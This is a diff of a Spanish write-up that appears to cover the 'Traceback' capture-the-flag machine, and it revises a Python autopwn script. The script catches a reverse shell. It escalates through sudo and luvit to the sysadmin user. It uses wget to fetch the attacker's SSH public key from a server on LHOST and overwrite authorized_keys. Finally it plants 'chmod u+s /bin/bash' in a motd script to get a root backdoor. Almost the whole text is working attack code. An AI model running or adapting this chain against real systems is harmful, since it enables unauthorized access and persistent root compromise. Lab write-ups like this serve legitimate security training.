@@ -212,14 +212,14 @@ Esto no acaba aquí, vamos a construirnos un autopwn utilizando python.
 
 ```python
 #!/usr/bin/env python3
-#Author: Intrusionz3r0
+
 
 import requests,time,threading,sys,signal
 from pwn import *
 
 #Variables Globales
 
-LPORT=443
+LPORT=1234
 
 def handler(key,frame):
 	print("Adios!!")
@@ -260,41 +260,40 @@ def getShell(LHOST):
 		p2.success("Estamos dentro del sistema.")
 
 
-def escalarRoot(LHOST,SSH):
+def escalarRoot(LHOST):
 	p3 = log.progress("Root")
 	p3.status("Escalando de webmin a sysadmin.")
 	shell.sendline(""" sudo -u sysadmin /home/sysadmin/luvit -e "os.execute('/bin/bash')" """)
+	shell.sendline("cd ~/.ssh")
 	time.sleep(2)
-	p3.status("Escribiendo clave ssh.")
-	shell.sendline(' echo "{}" > /home/sysadmin/.ssh/authorized_keys'.format(SSH))
+	p3.status("Sobreescribiendo clave ssh.")
+	shell.sendline("wget http://{}:8000/id_rsa.pub -O authorized_keys".format(LHOST))
 	time.sleep(2)
-	shell.sendline("cat /home/sysadmin/.ssh/authorized_keys")
-	p3.status("Asignando bit SUID a /bin/bash")
-	time.sleep(1)
-	shell.sendline("cd /etc/update-motd.d")
-	time.sleep(1)
-	shell.sendline('echo "chmod u+s /bin/bash" >> 00-header')
-	time.sleep(2)
-	shell.sendline("pwd && cat 00-header")
+	os.system("ps -aux | grep  'SimpleHTTPServer' | head -n 1 | awk '{print $2}' | xargs kill")
+	p3.status("Asignando SUID a /bin/bash")
+	time.sleep(3)
+	shell.sendline(""" cd /etc/update-motd.d && echo "chmod u+s /bin/bash" >> 00-header """)
 	p3.success("Somos root!!")
-	time.sleep(4)
 	sys.exit(0)
+
+def upServer():
+	os.system("cd ~/.ssh && python -m SimpleHTTPServer 8000 &")
 
 if __name__ == "__main__":
 
-	if(len(sys.argv) != 3):
-		log.info('Uso: sudo python {} <LHOST> <id_rsa.pub> ; ssh sysadmin@traceback.htb "bash -p"'.format(sys.argv[0]))
+	if(len(sys.argv) != 2):
+		log.info("Uso: python {} <LHOST> ; ssh sysadmin@traceback.htb 'bash -p'".format(sys.argv[0]))
 		sys.exit(0)
 
 	LHOST = sys.argv[1]
-	SSH = sys.argv[2]
 
 	shell = listen(LPORT,timeout=20)
 	try:
 		threading.Thread(target=getShell(LHOST)).start()
+		threading.Thread(target=upServer).start()
 	except Exception as e:
 		log.error(str(e))
 
 	if not (shell.sock is None):
-		escalarRoot(LHOST,SSH)
+		escalarRoot(LHOST)
 ```
